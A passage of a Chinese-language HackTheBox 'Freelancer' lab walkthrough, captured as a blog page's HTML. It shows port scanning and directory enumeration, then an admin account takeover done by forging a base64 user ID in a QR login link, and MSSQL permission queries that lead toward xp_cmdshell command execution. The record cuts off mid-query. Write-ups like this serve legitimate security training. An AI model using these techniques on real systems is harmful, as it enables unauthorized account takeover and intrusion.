@@ -1,0 +1,1156 @@
+<!doctype html>
+<html
+  lang="zh-cn" 
+  data-theme-mode="auto"
+  >
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8" />
+<meta
+  name="viewport"
+  content="width=device-width, initial-scale=1, shrink-to-fit=no"
+/><title>
+  HTB Freelancer | Ya1orin
+</title>
+<meta name="description" content="HackTheBox篇之Freelancer"/><script>
+  window.siteConfig = JSON.parse("{\"anchor_icon\":null,\"base\":\"http://localhost:1313/\",\"clipboard\":{\"copyright\":{\"count\":50,\"enable\":false,\"license_type\":\"by-nc-sa\"},\"fail\":{\"en\":\"Copy failed (ﾟ⊿ﾟ)ﾂ\",\"ja\":\"コピー失敗 (ﾟ⊿ﾟ)ﾂ\",\"pt-br\":\"Falha ao copiar (ﾟ⊿ﾟ)ﾂ\",\"zh-cn\":\"复制失败 (ﾟ⊿ﾟ)ﾂ\",\"zh-tw\":\"複製失敗 (ﾟ⊿ﾟ)ﾂ\"},\"success\":{\"en\":\"Copy successfully (*^▽^*)\",\"ja\":\"コピー成功 (*^▽^*)\",\"pt-br\":\"Copiado com sucesso (*^▽^*)\",\"zh-cn\":\"复制成功 (*^▽^*)\",\"zh-tw\":\"複製成功 (*^▽^*)\"}},\"code_block\":{\"expand\":true},\"i18n_languages\":[{\"Lang\":\"en\",\"LanguageName\":\"English\",\"LanguageCode\":\"\",\"Title\":\"\",\"LanguageDirection\":\"\",\"Weight\":1,\"Disabled\":false},{\"Lang\":\"zh-cn\",\"LanguageName\":\"简体中文\",\"LanguageCode\":\"\",\"Title\":\"\",\"LanguageDirection\":\"\",\"Weight\":1,\"Disabled\":false}],\"icon_font\":\"4552607_4k4bc36ef96\",\"outdate\":{\"daysago\":180,\"enable\":false,\"message\":{\"en\":\"This article was last updated on {time}. Please note that the content may no longer be applicable.\",\"ja\":\"この記事は最終更新日：{time}。記載内容が現在有効でない可能性がありますのでご注意ください。\",\"pt-br\":\"Este artigo foi atualizado pela última vez em {time}. Observe que o conteúdo pode não ser mais aplicável.\",\"zh-cn\":\"本文最后更新于 {time}，请注意文中内容可能已不适用。\",\"zh-tw\":\"本文最後更新於 {time}，請注意文中內容可能已不適用。\"}}}");
+  
+</script>
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link
+  rel="preload"
+  as="style"
+  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
+/>
+<link
+  rel="stylesheet"
+  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
+  media="print"
+  onload="this.media='all'"
+/>
+<link
+    rel="preload"
+    href="//at.alicdn.com/t/c/font_4552607_4k4bc36ef96.woff2"
+    as="font"
+    type="font/woff2"
+    crossorigin="anonymous"
+  /><link rel="stylesheet" href="/css/loader.css" />
+<meta property="og:type" content="website" />
+  <meta property="og:title" content="HTB Freelancer | Ya1orin" />
+  <meta
+    property="og:description"
+    content="HackTheBox篇之Freelancer"
+  />
+  <meta property="og:url" content="http://localhost:1313/post/htb-freelancer/" />
+  <meta
+    property="og:site_name"
+    content="Ya1orin"
+  />
+  <meta
+    property="og:image"
+    content="/"
+  />
+  <meta property="article:author" content="Ya1orin" />
+  <meta property="article:published_time" content="2024-10-30T19:15:05&#43;08:00" />
+  <meta property="article:modified_time" content="2025-11-10T17:00:59&#43;08:00" /><meta property="article:tag" content="WindowsMSSQLGenericWriteRBCD" /><meta name="twitter:card" content="summary" />
+  <meta name="twitter:image" content="/" />
+<link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/main.css" />
+<link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css"
+    integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei&#43;Zx/1oA/0l8ysE" crossorigin="anonymous"onload="this.onload=null;this.rel='stylesheet'"
+  /><link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/katex@0.16.24/dist/katex.min.css"
+    integrity="sha384-tTgKLjMYmJr94v8qu2PE5MUGSMbyN2xiH266JUB3gpm8vnnJywd1dWSOEfrFz&#43;YI" crossorigin="anonymous"onload="this.onload=null;this.rel='stylesheet'"
+  /><link
+    rel="stylesheet"
+    href="https://npm.webcache.cn/gitalk@1.8.0/dist/gitalk.css"
+    integrity="sha384-X7z7PUv2B67D8sPJyzDyGZSco1ADwmdI7ed4eCGtTKkClfyDFpPL9WgAn9XVr/Io" crossorigin="anonymous"/><script
+    src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"
+    integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script><link
+    rel="stylesheet"
+    href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css"
+    integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous"/></head>
+  <body><div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate"><svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+          M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg></div><div class="loading-word">Loading...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script><div id="copy-tooltip"></div>
+<div id="lang-tooltip">
+本文章没有找到对应的语言版本
+</div>
+<div id="heatmap-tooltip"></div><div id="container">
+      <div id="wrap"><div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation"><a class="main-nav-link-wrap" href="/">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <span class="main-nav-link">首页</span>
+      </a><a class="main-nav-link-wrap" href="/archives">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <span class="main-nav-link">归档</span>
+      </a><a class="main-nav-link-wrap" href="/about">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <span class="main-nav-link">关于</span>
+      </a><a class="main-nav-link-wrap" href="/friend">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <span class="main-nav-link">友链</span>
+      </a><a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation"><a id="nav-search-btn" class="nav-icon popup-trigger" title="搜索" aria-label="搜索"></a></nav><nav id="i18n-nav" aria-label="Language selection">
+      <div class="custom-dropdown">
+        <div class="select-selected" id="select-selected" role="button" aria-haspopup="listbox" aria-expanded="false" aria-label="Language menu">
+          <span id="nav-language-btn" class="nav-icon" style="padding: 0 20px 0 0"></span>
+          <span id="selected-lang">简体中文</span>
+        </div>
+        <ul class="select-items" id="select-items" role="listbox" aria-label="Languages"><li data-value="en" role="option" arial-selected="false" >English</li><li data-value="zh-cn" role="option" class="selected" arial-selected="true" >简体中文</li></ul>
+      </div>
+      <script>
+        var selectSelected = document.getElementById("select-selected");
+        var selectedLang = document.getElementById("selected-lang");
+        var selectItems = document.getElementById("select-items");
+        var selectOptions = selectItems.querySelectorAll("li");
+
+        selectSelected.addEventListener("click", () => {
+          selectItems.classList.toggle("show");
+          var expanded = selectSelected.getAttribute("aria-expanded") === "true";
+          selectSelected.setAttribute("aria-expanded", (!expanded).toString());
+        });
+
+        selectOptions.forEach((item) => {
+          item.addEventListener("click", () => {
+            const langMap = {};selectedLang.textContent = item.textContent;
+            selectItems.classList.remove("show");
+            selectOptions.forEach((option) => {
+              option.classList.remove("selected");
+            });
+            item.classList.add("selected");
+            if (item.dataset.value === 'zh-cn') {
+              return;
+            }
+            if (!langMap[item.dataset.value]) {
+              _$("#lang-tooltip").style.opacity = "1";
+              setTimeout(() => {
+                _$("#lang-tooltip").style.opacity = "0";
+              }, 1000);
+              return;
+            }
+            window.location = langMap[item.dataset.value];
+          });
+        });
+
+        document.addEventListener("click", (event) => {
+          if (!event.target.closest(".custom-dropdown")) {
+            selectItems.classList.remove("show");
+            selectSelected.setAttribute("aria-expanded", "false");
+          }
+        });
+      </script>
+    </nav></div>
+<header id="header" aria-label="Site header"><picture></picture><img  fetchpriority="high" src="/images/banner.webp" alt="HTB Freelancer"><div id="header-outer">
+    <div id="header-title"><span id="logo">
+            <h1 data-aos="slide-up">HTB Freelancer</h1>
+          </span><h2 id="subtitle-wrap" data-aos="slide-down"></h2></div>
+  </div>
+</header><div id="content"
+          aria-label="Page content"
+          class="sidebar-left"
+            ><aside id="sidebar" aria-label="Sidebar"><div class="sidebar-wrapper-container sticky"><div class="sidebar-wrapper">
+    <div
+      class="sidebar-wrap"
+      data-aos="fade-up"
+    ><div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class">
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#知识点">知识点</a></li>
+    <li><a href="#信息收集">信息收集</a>
+      <ul>
+        <li><a href="#nmap扫描">nmap扫描</a></li>
+        <li><a href="#smb">SMB</a></li>
+        <li><a href="#80端口">80端口</a></li>
+      </ul>
+    </li>
+    <li><a href="#获得网站admin权限">获得网站admin权限</a></li>
+    <li><a href="#mssql通过rce获得shell">MSSQL通过RCE获得shell</a></li>
+    <li><a href="#sql_svc-mikasaackerman">sql_svc-&gt;mikasaAckerman</a></li>
+    <li><a href="#mikasaackerman-lorra199">mikasaAckerman-&gt;lorra199</a></li>
+    <li><a href="#权限提升">权限提升</a>
+      <ul>
+        <li><a href="#bloodhound信息收集">bloodhound信息收集</a></li>
+        <li><a href="#rbcd">RBCD</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+</div></div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img
+    data-src="/avatar/avatar.webp"
+    data-sizes="auto"
+    alt="Ya1orin"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">Ya1orin</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div><div class="sidebar-state-number">43</div>
+  </div>
+  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
+    <div>分类</div>
+    <div class="sidebar-state-number">
+      3
+    </div>
+  </a>
+  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
+    <div>标签</div>
+    <div class="sidebar-state-number">37</div>
+  </a>
+</div>
+<div class="sidebar-social"><div class="icon-github sidebar-social-icon">
+      <a
+        href="https://github.com/ya1orin"
+        itemprop="url"
+        target="_blank"
+        aria-label="github"
+        rel="noopener nofollow noreferrer"
+      ></a>
+    </div></div>
+<div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="首页"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">首页</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="归档"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">归档</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="关于"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">关于</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/friend"
+        aria-label="友链"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">友链</div>
+    </div></div>
+</div><div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div></div>
+  </div><div class="sidebar-widget"></div></div></aside>
+<section id="main" aria-label="Main content"><article
+  class="h-entry article"
+  itemscope
+  itemtype="https://schema.org/BlogPosting"
+>
+  <div
+    class="article-inner"
+    data-aos="fade-up"
+  >
+    <div class="article-meta"><div class="article-date">
+  <span
+    class="article-date-link icon-calendar"
+    data-aos="zoom-in"
+  >
+    <time datetime="2024-10-30 19:15:05 &#43;0800 CST" itemprop="datePublished"
+      >2024-10-30</time
+    >
+    <time style="display: none;" id="post-update-time"
+      >2025-11-10</time
+    >
+  </span></div>
+<div class="article-category"><a
+      class="article-category-link"
+      href="/categories/hackthebox"
+      data-aos="zoom-in"
+      >HACKTHEBOX</a
+    ></div>
+</div><div class="hr-line"></div><div class="e-content article-entry" itemprop="articleBody"><blockquote>
+<p>靶机ip：10.10.11.5</p>
+</blockquote>
+<h1 id="知识点">
+<a class="header-anchor" href="#%e7%9f%a5%e8%af%86%e7%82%b9"></a>
+知识点
+</h1><ul>
+<li>MSSQL通过xp_cmdshell 实现RCE</li>
+<li>密码喷洒</li>
+<li>滥用GenericWrite</li>
+<li>RBCD约束委派</li>
+<li>PTH传递攻击</li>
+</ul>
+<h1 id="信息收集">
+<a class="header-anchor" href="#%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86"></a>
+信息收集
+</h1><h2 id="nmap扫描">
+<a class="header-anchor" href="#nmap%e6%89%ab%e6%8f%8f"></a>
+nmap扫描
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap --min-rate <span class="m">10000</span> -A -sV -sC -p- 10.10.11.5
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-30 19:20 CST
+</span></span><span class="line"><span class="cl">Warning: 10.10.11.5 giving up on port because retransmission cap hit (10).
+</span></span><span class="line"><span class="cl">sendto in send_ip_packet_sd: sendto(5, packet, 44, 0, 10.10.11.5, 16) =&gt; Operation not permitted
+</span></span><span class="line"><span class="cl">Offending packet: TCP 10.10.16.4:35511 &gt; 10.10.11.5:8189 S ttl=44 id=31021 iplen=44  seq=2972970908 win=1024 &lt;mss 1460&gt;
+</span></span><span class="line"><span class="cl">Nmap scan report for 10.10.11.5
+</span></span><span class="line"><span class="cl">Host is up (0.83s latency).
+</span></span><span class="line"><span class="cl">Not shown: 59837 closed tcp ports (reset), 5672 filtered tcp ports (no-response)
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE       VERSION
+</span></span><span class="line"><span class="cl">53/tcp    open  domain        Simple DNS Plus
+</span></span><span class="line"><span class="cl">80/tcp    open  http          nginx 1.25.5
+</span></span><span class="line"><span class="cl">|_http-title: Did not follow redirect to http://freelancer.htb/
+</span></span><span class="line"><span class="cl">|_http-server-header: nginx/1.25.5
+</span></span><span class="line"><span class="cl">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-30 16:21:28Z)
+</span></span><span class="line"><span class="cl">135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: freelancer.htb0., Site: Default-First-Site-Name)
+</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds?
+</span></span><span class="line"><span class="cl">464/tcp   open  kpasswd5?
+</span></span><span class="line"><span class="cl">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">636/tcp   open  tcpwrapped
+</span></span><span class="line"><span class="cl">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: freelancer.htb0., Site: Default-First-Site-Name)
+</span></span><span class="line"><span class="cl">3269/tcp  open  tcpwrapped
+</span></span><span class="line"><span class="cl">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+</span></span><span class="line"><span class="cl">|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class="line"><span class="cl">|_http-title: Not Found
+</span></span><span class="line"><span class="cl">9389/tcp  open  mc-nmf        .NET Message Framing
+</span></span><span class="line"><span class="cl">47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+</span></span><span class="line"><span class="cl">|_http-title: Not Found
+</span></span><span class="line"><span class="cl">|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class="line"><span class="cl">49664/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49665/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49666/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49667/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49670/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">49677/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49678/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49683/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49704/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">55297/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
+</span></span><span class="line"><span class="cl">| ms-sql-info:
+</span></span><span class="line"><span class="cl">|   10.10.11.5\SQLEXPRESS:
+</span></span><span class="line"><span class="cl">|     Instance name: SQLEXPRESS
+</span></span><span class="line"><span class="cl">|     Version:
+</span></span><span class="line"><span class="cl">|       name: Microsoft SQL Server 2019 RTM
+</span></span><span class="line"><span class="cl">|       number: 15.00.2000.00
+</span></span><span class="line"><span class="cl">|       Product: Microsoft SQL Server 2019
+</span></span><span class="line"><span class="cl">|       Service pack level: RTM
+</span></span><span class="line"><span class="cl">|       Post-SP patches applied: false
+</span></span><span class="line"><span class="cl">|     TCP port: 55297
+</span></span><span class="line"><span class="cl">|     Named pipe: \\10.10.11.5\pipe\MSSQL$SQLEXPRESS\sql\query
+</span></span><span class="line"><span class="cl">|_    Clustered: false
+</span></span><span class="line"><span class="cl">| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+</span></span><span class="line"><span class="cl">| Not valid before: 2024-10-30T16:19:02
+</span></span><span class="line"><span class="cl">|_Not valid after:  2054-10-30T16:19:02
+</span></span><span class="line"><span class="cl">| ms-sql-ntlm-info:
+</span></span><span class="line"><span class="cl">|   10.10.11.5\SQLEXPRESS:
+</span></span><span class="line"><span class="cl">|     Target_Name: FREELANCER
+</span></span><span class="line"><span class="cl">|     NetBIOS_Domain_Name: FREELANCER
+</span></span><span class="line"><span class="cl">|     NetBIOS_Computer_Name: DC
+</span></span><span class="line"><span class="cl">|     DNS_Domain_Name: freelancer.htb
+</span></span><span class="line"><span class="cl">|     DNS_Computer_Name: DC.freelancer.htb
+</span></span><span class="line"><span class="cl">|     DNS_Tree_Name: freelancer.htb
+</span></span><span class="line"><span class="cl">|_    Product_Version: 10.0.17763
+</span></span><span class="line"><span class="cl">|_ssl-date: 2024-10-30T16:23:30+00:00; +5h00m04s from scanner time.
+</span></span><span class="line"><span class="cl">Device type: general purpose
+</span></span><span class="line"><span class="cl">Running (JUST GUESSING): Microsoft Windows 2019|Vista|10|2012|Longhorn|7|8.1|2016|11 (94%)
+</span></span><span class="line"><span class="cl">OS CPE: cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2012 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_7:::ultimate cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_8
+</span></span><span class="line"><span class="cl">Aggressive OS guesses: Microsoft Windows Server 2019 (94%), Microsoft Windows Vista SP1 (92%), Microsoft Windows 10 1709 - 1909 (91%), Microsoft Windows Server 2012 (91%), Microsoft Windows 10 2004 (90%), Microsoft Windows Longhorn (90%), Microsoft Windows Server 2012 R2 Update 1 (90%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (90%), Microsoft Windows 7 SP1 (90%), Microsoft Windows Server 2012 or Server 2012 R2 (89%)
+</span></span><span class="line"><span class="cl">No exact OS matches for host (test conditions non-ideal).
+</span></span><span class="line"><span class="cl">Network Distance: 2 hops
+</span></span><span class="line"><span class="cl">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl">| smb2-security-mode:
+</span></span><span class="line"><span class="cl">|   3:1:1:
+</span></span><span class="line"><span class="cl">|_    Message signing enabled and required
+</span></span><span class="line"><span class="cl">| smb2-time:
+</span></span><span class="line"><span class="cl">|   date: 2024-10-30T16:23:12
+</span></span><span class="line"><span class="cl">|_  start_date: N/A
+</span></span><span class="line"><span class="cl">|_clock-skew: mean: 5h00m03s, deviation: 0s, median: 5h00m03s
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">TRACEROUTE (using port 1720/tcp)
+</span></span><span class="line"><span class="cl">HOP RTT       ADDRESS
+</span></span><span class="line"><span class="cl">1   689.59 ms 10.10.16.1
+</span></span><span class="line"><span class="cl">2   366.60 ms 10.10.11.5
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap done: 1 IP address (1 host up) scanned in 196.91 seconds
+</span></span></code></pre></div><p>开放若干端口，可以看到这是一台域控，根据80端口的结果，可以发现域名<code>freelancer.htb</code>，将其添加到<code>/etc/hosts</code>中，同时存在<code>SQL Server</code></p>
+<h2 id="smb">
+<a class="header-anchor" href="#smb"></a>
+SMB
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">smbclient -L //10.10.11.5
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241030193421240-862466878.png" alt="image-20241030193415328"></p>
+<p>smb没有重要信息</p>
+<h2 id="80端口">
+<a class="header-anchor" href="#80%e7%ab%af%e5%8f%a3"></a>
+80端口
+</h2><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241030195019202-355984579.png" alt="image-20241030195013398"></p>
+<p>扫描一下目录</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gobuster dir -u http://freelancer.htb/ -w /usr/share/wordlists/dirb/common.txt -t <span class="m">5</span>
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241030194522012-1201054933.png" alt="image-20241030194515723"></p>
+<p>访问后还是没什么重要信息</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241030210922158-590770136.png" alt="image-20241030210916487"></p>
+<p>随便点了篇文章发现url的数据像是用户的编号</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241030210950614-402962867.png" alt="image-20241030210944922"></p>
+<p>测试后发现id为2的时候是admin用户</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241030195947536-985652884.png" alt="image-20241030195941232"></p>
+<p>注册个自由账户登录后发现路由跳转到<code>/job/search/</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241030200358580-254071980.png" alt="image-20241030200352902"></p>
+<p>发现还是没有登陆进去</p>
+<p>在注册个员工账户</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241103185552789-1784702947.png" alt="image-20241030201044315"></p>
+<p>发现没激活不让登录，注意到两个账户登陆的表单是同一个，还有个忘记密码，尝试一下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241030201435602-1815788951.png" alt="image-20241030201429836"></p>
+<p>通过忘记密码功能成功以员工身份登录到后台</p>
+<h1 id="获得网站admin权限">
+<a class="header-anchor" href="#%e8%8e%b7%e5%be%97%e7%bd%91%e7%ab%99admin%e6%9d%83%e9%99%90"></a>
+获得网站admin权限
+</h1><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241030203205421-979958180.png" alt="image-20241030203159702"></p>
+<p>注意到有个QRcode，扫描一下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241030203726339-1392968181.png" alt="image-20241030203720362"></p>
+<p>有一个url，访问url会跳转到当前用户</p>
+<p>注意到中间可能是base64编码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241030203803580-1093742398.png" alt="image-20241030203757961"></p>
+<p>解码后发现是10012</p>
+<p>之前知道 admin 的 id 是2，感觉可以尝试伪造一下</p>
+<p><strong>ps: 注意每个QRcode生成的链接有时效性，需要在生成QRcode后就替换并访问（这里我试了好多次）</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241030211612757-592831591.png" alt="image-20241030211606674"></p>
+<p>获取到网站的admin权限</p>
+<h1 id="mssql通过rce获得shell">
+<a class="header-anchor" href="#mssql%e9%80%9a%e8%bf%87rce%e8%8e%b7%e5%be%97shell"></a>
+MSSQL通过RCE获得shell
+</h1><p>当前页面并没有什么新的东西，之前目录扫描知道有admin路由，访问一下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031155340969-1949040649.png" alt="image-20241031155320549"></p>
+<p>注意到右下角有个<code>SQL Terminal</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241103185612117-1781510714.png" alt="image-20241031160042048"></p>
+<p>简单执行<code>select @@version;</code>发现可以执行sql语句</p>
+<p>尝试利用sql的执行命令</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031161914233-762073518.png" alt="image-20241031160156445"></p>
+<p>利用SQL枚举，尝试<code>xp_cmdshell</code></p>
+<p><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#execute-os-commands">Pentesting MSSQL</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="k">SYSTEM_USER</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241031162235113-1486071814.png" alt="image-20241031162228101"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="k">distinct</span><span class="w"> </span><span class="n">b</span><span class="p">.</span><span class="n">name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">sys</span><span class="p">.</span><span class="n">server_permissions</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="k">INNER</span><span class="w"> </span><span class="k">JOIN</span><span class="w"> </span><span class="n">sys</span><span class="p">.</span><span class="n">server_principals</span><span class="w"> </span><span class="n">b</span><span class="w"> </span><span class="k">ON</span><span class="w"> </span><span class="n">a</span><span class="p">.</span><span class="n">grantor_principal_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">b</span><span class="p">.</span><span class="n">principal_id</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">a</span><span class="p">.</span><span class="n">permission_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;IMPERSONATE&#39;</span><span class="p">;</span><span class="w">
